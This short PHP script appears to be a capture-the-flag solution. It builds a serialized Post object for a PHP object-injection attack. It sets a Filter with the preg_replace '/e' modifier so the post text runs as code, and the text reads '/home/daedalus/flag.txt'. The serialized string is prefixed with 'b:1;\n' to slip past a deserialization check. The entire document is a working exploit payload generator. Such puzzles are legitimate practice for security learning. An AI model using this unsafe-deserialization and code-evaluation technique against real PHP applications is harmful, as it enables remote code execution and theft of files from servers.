
<?php
require_once('steves_list_backup/includes/classes.php');
$filter = [new Filter('/^(.*)/e', 'strtoupper(\\\\1)')];
 
$text = "file_get_contents('/home/daedalus/flag.txt',true)";
$text = htmlspecialchars($text);
 
$title = 'title';
$title = htmlspecialchars($title);
 
$post = new Post($title, $text, $filter);
 
$post_ser = serialize($post);
 
$ser = 'b:1;\n' .  $post_ser;
echo $ser;
?>
